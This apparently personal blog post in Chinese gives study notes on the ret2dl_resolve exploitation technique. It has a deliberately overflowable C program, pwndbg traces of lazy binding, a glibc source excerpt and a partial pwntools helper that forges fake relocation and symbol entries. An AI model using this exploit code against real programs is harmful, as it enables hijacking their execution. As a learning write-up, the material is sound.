<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="关于ret2dl_resolve这个技巧，很多前辈已经说的很详细了。 所以这里我只是简单的做个记录，不指望能讲的多好。 网络上前辈的教程：  http:&#x2F;&#x2F;rk700.github.io&#x2F;2015&#x2F;08&#x2F;09&#x2F;return-to-dl-resolve&#x2F;http:&#x2F;&#x2F;angelboy.logdown.com&#x2F;posts&#x2F;283218-return-to-dl-resolvehttp:&#x2F;&#x2F;pwn4.f">
<meta property="og:type" content="article">
<meta property="og:title" content="ret2dl_resolve学习笔记">
<meta property="og:url" content="https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="veritas501&#39;s blog">
<meta property="og:description" content="关于ret2dl_resolve这个技巧，很多前辈已经说的很详细了。 所以这里我只是简单的做个记录，不指望能讲的多好。 网络上前辈的教程：  http:&#x2F;&#x2F;rk700.github.io&#x2F;2015&#x2F;08&#x2F;09&#x2F;return-to-dl-resolve&#x2F;http:&#x2F;&#x2F;angelboy.logdown.com&#x2F;posts&#x2F;283218-return-to-dl-resolvehttp:&#x2F;&#x2F;pwn4.f">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/dl_resolve_3b300c74dae850b1abab0c0ba4507d4b.png">
<meta property="og:image" content="https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/dl_resolve_8c8c7d866ba50da8775bfa9b12518cba.png">
<meta property="article:published_time" content="2017-10-06T16:00:00.000Z">
<meta property="article:modified_time" content="2023-12-08T03:09:28.406Z">
<meta property="article:author" content="veritas501">
<meta property="article:tag" content="PWN">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/dl_resolve_3b300c74dae850b1abab0c0ba4507d4b.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>ret2dl_resolve学习笔记</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
		<script type="text/x-mathjax-config">
		  MathJax.Hub.Config({
			tex2jax: {
			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
			  inlineMath: [['$','$']]
			}
		  });
		</script>
		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/veritas501">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2017_11_05-2017%E4%B8%8A%E6%B5%B7%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B_%E9%83%A8%E5%88%86writeup/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2017_10_05-%E6%B3%A8%E5%86%8C%E6%9C%BA%E9%9F%B3%E4%B9%90%E9%9A%8F%E8%AE%B0/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&text=ret2dl_resolve学习笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=ret2dl_resolve学习笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&is_video=false&description=ret2dl_resolve学习笔记"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=ret2dl_resolve学习笔记&body=Check out this article: https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=ret2dl_resolve学习笔记"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=ret2dl_resolve学习笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=ret2dl_resolve学习笔记"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&title=ret2dl_resolve学习笔记"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&name=ret2dl_resolve学习笔记&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://veritas501.github.io/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/&t=ret2dl_resolve学习笔记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#x86"><span class="toc-number">1.</span> <span class="toc-text">x86</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#x64"><span class="toc-number">2.</span> <span class="toc-text">x64</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        ret2dl_resolve学习笔记
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">veritas501</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2017-10-06T16:00:00.000Z" class="dt-published" itemprop="datePublished">2017-10-07</time>
        
        (Updated: <time datetime="2023-12-08T03:09:28.406Z" class="dt-updated" itemprop="dateModified">2023-12-08</time>)
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/PWN/" rel="tag">PWN</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>关于ret2dl_resolve这个技巧，很多前辈已经说的很详细了。</p>
<p>所以这里我只是简单的做个记录，不指望能讲的多好。</p>
<p>网络上前辈的教程：</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a target="_blank" rel="noopener" href="http://angelboy.logdown.com/posts/283218-return-to-dl-resolve">http://angelboy.logdown.com/posts/283218-return-to-dl-resolve</a><br><a target="_blank" rel="noopener" href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br><a target="_blank" rel="noopener" href="https://github.com/inaz2/roputils/blob/master/roputils.py">https://github.com/inaz2/roputils/blob/master/roputils.py</a></p>
</blockquote>
<p>参考了很多，才理解，我好菜啊。</p>
<h2 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#gcc pwn.c -fno-stack-protector -m32 -o pwn</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">fun</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>,buffer,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">fun</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设有这样一个小程序。</p>
<p>执行read(0,buffer,0x200)的时候实际上发生了这些：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">//将三个参数压栈</span><br><span class="line">   0x8048414 &lt;fun+9&gt;     push   0x200</span><br><span class="line">   0x8048419 &lt;fun+14&gt;    lea    eax, [ebp - 0x28]</span><br><span class="line">   0x804841c &lt;fun+17&gt;    push   eax</span><br><span class="line">   0x804841d &lt;fun+18&gt;    push   0</span><br><span class="line">//call到read的plt上</span><br><span class="line">   0x804841f &lt;fun+20&gt;    call   read@plt                      &lt;0x80482e0&gt;</span><br><span class="line"></span><br><span class="line">//jmp到read的got表上的地址处，由于第一次调用（不知道lazy binding的自行了解），</span><br><span class="line">//got值为read@plt+6，</span><br><span class="line">   0x80482e0  &lt;read@plt&gt;                  jmp    dword ptr [_GLOBAL_OFFSET_TABLE_+12] &lt;0x804a00c&gt;</span><br><span class="line">   </span><br><span class="line">pwndbg&gt; x/wx 0x804a00c</span><br><span class="line">0x804a00c:  0x080482e6</span><br><span class="line"></span><br><span class="line">//此时入栈的0是JMPREL段（对应 .rel.plt节）的read的Elf32_Rel的相对偏移,即rel_offset</span><br><span class="line">   0x80482e6  &lt;read@plt+6&gt;                push   0</span><br><span class="line">   0x80482eb  &lt;read@plt+11&gt;               jmp    0x80482d0</span><br><span class="line"></span><br><span class="line">//readelf中JMPREL段的地址</span><br><span class="line">Dynamic section at offset 0xf14 contains 24 entries:</span><br><span class="line">  标记        类型                         名称/值</span><br><span class="line"> 0x00000017 (JMPREL)                     0x8048298</span><br><span class="line"></span><br><span class="line">//JMPREL段相应偏移处read的Elf32_Rel结构体</span><br><span class="line">pwndbg&gt; x/2wx 0x8048298+0</span><br><span class="line">0x8048298:  0x0804a00c  0x00000107</span><br><span class="line"></span><br><span class="line">//所对应的结构体</span><br><span class="line">typedef uint32_t Elf32_Addr;</span><br><span class="line">typedef uint32_t Elf32_Word;</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Addr    r_offset;               /* Address */</span><br><span class="line">  Elf32_Word    r_info;                 /* Relocation type and symbol index */</span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line">#define ELF32_R_SYM(val) ((val) &gt;&gt; 8) #define ELF32_R_TYPE(val) ((val) &amp; 0xff)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//所以r_offset为0x0804a00c，r_info为0x00000107</span><br><span class="line">//r_info则保存的是其类型和符号序号。</span><br><span class="line">//根据宏的定义，可知对于此条目，其类型为ELF32_R_TYPE(r_info)=7，对应于R_386_JUMP_SLOT；</span><br><span class="line">//其symbol index则为RLF32_R_SYM(r_info)=1。</span><br><span class="line"></span><br><span class="line">//以下为 RLF32_R_SYM的结构体</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;   /* Symbol name (string tbl index) */</span><br><span class="line">  Elf32_Addr    st_value;  /* Symbol value */</span><br><span class="line">  Elf32_Word    st_size;   /* Symbol size */</span><br><span class="line">  unsigned char st_info;   /* Symbol type and binding */</span><br><span class="line">  unsigned char st_other;  /* Symbol visibility under glibc&gt;=2.2 */</span><br><span class="line">  Elf32_Section st_shndx;  /* Section index */</span><br><span class="line">&#125; Elf32_Sym;</span><br><span class="line"></span><br><span class="line">//这个结构体存在SYMTAB段，对应.dynsym节中，RLF32_R_SYM为read的这个结构体在SYMTAB段的index</span><br><span class="line"></span><br><span class="line">//readelf中SYMTAB段的地址</span><br><span class="line">Dynamic section at offset 0xf14 contains 24 entries:</span><br><span class="line">  标记        类型                         名称/值</span><br><span class="line">0x00000006 (SYMTAB)                     0x80481cc</span><br><span class="line">0x0000000b (SYMENT)                     16 (bytes)//单个结构体的大小</span><br><span class="line"></span><br><span class="line">//内存中的结构体</span><br><span class="line">pwndbg&gt; x/4wx 0x80481cc+1*16</span><br><span class="line">0x80481dc:  0x0000001a  0x00000000  0x00000000  0x00000012</span><br><span class="line"></span><br><span class="line">//我们只需要关注st_name即可，此处st_name为0x0000001a ，即name在STRTAB段的偏移</span><br><span class="line"></span><br><span class="line">//readelf中STRTAB段的地址</span><br><span class="line">Dynamic section at offset 0xf14 contains 24 entries:</span><br><span class="line">  标记        类型                         名称/值</span><br><span class="line"> 0x00000005 (STRTAB)                     0x804821c</span><br><span class="line"></span><br><span class="line">//read的name</span><br><span class="line">pwndbg&gt; x/s 0x804821c+0x1a</span><br><span class="line">0x8048236:  &quot;read&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//=============================</span><br><span class="line"></span><br><span class="line">//综上，通过之前的push 0x0，我们得到了各个在dl_resolve必须用到的结构体，系统也是这样获取的。</span><br><span class="line">//回到刚才的这两句代码继续...</span><br><span class="line"></span><br><span class="line">   0x80482e6  &lt;read@plt+6&gt;                push   0</span><br><span class="line">   0x80482eb  &lt;read@plt+11&gt;               jmp    0x80482d0</span><br><span class="line"></span><br><span class="line">//0x804a004即为GOT[0],0x804a008即为GOT[1]</span><br><span class="line">//前者是link_map，后者是_dl_runtime_resolve的地址</span><br><span class="line">pwndbg&gt; x/2i 0x80482d0</span><br><span class="line">   0x80482d0:   push   DWORD PTR ds:0x804a004</span><br><span class="line">   0x80482d6:   jmp    DWORD PTR ds:0x804a008</span><br><span class="line"></span><br><span class="line">//也就是最后程序调用了_dl_runtime_resolve(link_map, rel_offset);</span><br><span class="line"></span><br><span class="line">//我们需要在某处构造好上述的结构体，就能将任意符号解析到任意地址了。</span><br></pre></td></tr></table></figure>

<p><img src="/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/dl_resolve_3b300c74dae850b1abab0c0ba4507d4b.png"></p>
<p><img src="/2017_10_07-ret2dl_resolve%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/dl_resolve_8c8c7d866ba50da8775bfa9b12518cba.png"></p>
<p>具体构造过程参考上述的几个博客，这里就不再赘述了。</p>
<p>不过这里有一个坑，就是version。由于我们一般把这个Elf32_Rel写在bss，所以rel_offset会很大，version处出现了错误，会导致程序终止。</p>
<p><a target="_blank" rel="noopener" href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#82">https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html#82</a></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">82</span>     <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">83        used don&#x27;t look in the global scope.  */</span></span><br><span class="line"><span class="number">84</span>    <span class="keyword">if</span> (__builtin_expect (<span class="built_in">ELFW</span>(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line"><span class="number">85</span>      &#123;</span><br><span class="line"><span class="number">86</span>        <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">r_found_version</span> *version = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">87</span>  </span><br><span class="line"><span class="number">88</span>        <span class="keyword">if</span> (l-&gt;l_info[<span class="built_in">VERSYMIDX</span> (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">89</span>          &#123;</span><br><span class="line"><span class="number">90</span>            <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line"><span class="number">91</span>              (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[<span class="built_in">VERSYMIDX</span> (DT_VERSYM)]);</span><br><span class="line"><span class="number">92</span>            <span class="built_in">ElfW</span>(Half) ndx = vernum[<span class="built_in">ELFW</span>(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line"><span class="number">93</span>            version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line"><span class="number">94</span>            <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line"><span class="number">95</span>              version = <span class="literal">NULL</span>;</span><br><span class="line"><span class="number">96</span>          &#125;</span><br><span class="line"><span class="number">97</span>  </span><br><span class="line"><span class="number">98</span>        <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment">99           not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment">100          we are not using any threads (yet).  */</span></span><br><span class="line"><span class="number">101</span>       <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line"><span class="number">102</span>       <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line"><span class="number">103</span>         &#123;</span><br><span class="line"><span class="number">104</span>           <span class="built_in">THREAD_GSCOPE_SET_FLAG</span> ();</span><br><span class="line"><span class="number">105</span>           flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line"><span class="number">106</span>         &#125;</span><br><span class="line"><span class="number">107</span> </span><br><span class="line"><span class="number">108</span> <span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line"><span class="number">109</span>       RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="number">110</span> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="number">111</span> </span><br><span class="line"><span class="number">112</span>       result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line"><span class="number">113</span>                                     version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br></pre></td></tr></table></figure>

<p>要让version为NULL，一个比较稳的方法是构造ndx为0。</p>
<p>也就是这行：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ElfW</span>(Half) ndx = vernum[<span class="built_in">ELFW</span>(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br></pre></td></tr></table></figure>

<p>为了练习，我使用pwntools的模块，仿造roputils写了一个ret2dl_resolve的函数。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">ret2dl_resolve_x86</span>(<span class="params">ELF_obj,func_name,resolve_addr,fake_stage,do_slim=<span class="number">1</span></span>):</span><br><span class="line">    jmprel = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_JMPREL&quot;</span>)<span class="comment">#rel_plt</span></span><br><span class="line">    relent = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_RELENT&quot;</span>)</span><br><span class="line">    symtab = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_SYMTAB&quot;</span>)<span class="comment">#dynsym</span></span><br><span class="line">    syment = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_SYMENT&quot;</span>)</span><br><span class="line">    strtab = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_STRTAB&quot;</span>)<span class="comment">#dynstr</span></span><br><span class="line">    versym = ELF_obj.dynamic_value_by_tag(<span class="string">&quot;DT_VERSYM&quot;</span>)<span class="comment">#version</span></span><br><span class="line">    plt0 = ELF_obj.get_section_by_name(<span class="string">&#x27;.plt&#x27;</span>).header.sh_addr</span><br><span class="line"></span><br><span class="line">    p_name = fake_stage+<span class="number">8</span>-strtab</span><br><span class="line">    len_bypass_version = <span class="number">8</span>-(<span class="built_in">len</span>(func_name)+<span class="number">1</span>)%<span class="number">0x8</span></span><br><span class="line">    sym_addr_offset = fake_stage+<span class="number">8</span>+(<span class="built_in">len</span>(func_name)+<span class="number">1</span>)+len_bypass_version-symtab</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> sym_addr_offset%<span class="number">0x10</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> sym_addr_offset%<span class="number">0x10</span> == <span class="number">8</span>:</span><br><span class="line">            len_bypass_version+=<span class="number">8</span></span><br><span class="line">            sym_addr_offset = fake_stage+<span class="number">8</span>+(<span class="built_in">len</span>(func_name)+<span class="number">1</span>)+len_bypass_version-symtab</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            error(<span class="string">&#x27;something error!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    fake_sym = sym_addr_offset/<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        fake_ndx = u16(ELF_obj.read(versym+fake_sym*<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line">        <span class="keyword">if</span> fake_ndx != <span class="number">0</span>:</span><br><span class="line">            fake_sym+=<span class="number">1</span></span><br><span class="line">            len_bypass_version+=<span class="number">0x10</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> do_slim:</span><br><span class="line">        slim = len_bypass_version - len_bypass_version%<span class="number">8</span></span><br><span class="line">        version = len_bypass_version%<span class="number">8</span></span><br><span class="line">        resolve_data,resolve_call=ret2dl_resolve_x86(ELF_obj,func_name,resolve_addr,fake_stage+slim,<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> (resolve_data,resolve_call,fake_stage+slim)</span><br><span class="line"></span><br><span class="line">    fake_r_info = fake_sym&lt;&lt;<span class="number">8</span>|<span class="number">0x7</span></span><br><span class="line">    